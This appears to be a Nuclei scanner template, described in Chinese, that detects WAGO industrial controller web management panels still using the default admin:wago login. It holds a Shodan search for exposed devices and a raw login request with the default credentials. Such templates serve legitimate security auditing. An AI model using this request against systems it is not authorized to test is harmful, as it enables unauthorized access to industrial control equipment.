id: wago-webbased-default-login

info:
  name: WAGO Web based Management 默认口令登录（弱口令）
  author: biero-el-corridor
  severity: high
  description: |
    该模板通过尝试 WAGO Web based Management 的默认凭据（如 admin:wago），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  metadata:
    shodan-query: html:"WAGO Ethernet Web-based Management"
    verified: true
    max-request: 1
  tags: wago,default-login,vuln

http:
  - raw:
      - |
        POST /wbm/login.php HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
        Origin: {{RootURL}}
        Referer: {{RootURL}}/wbm/index.php

        {"username":"admin","password":"wago"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"username":"admin"'
          - '"isDefaultPW":"1"'
        condition: and

      - type: status
        status:
          - 200
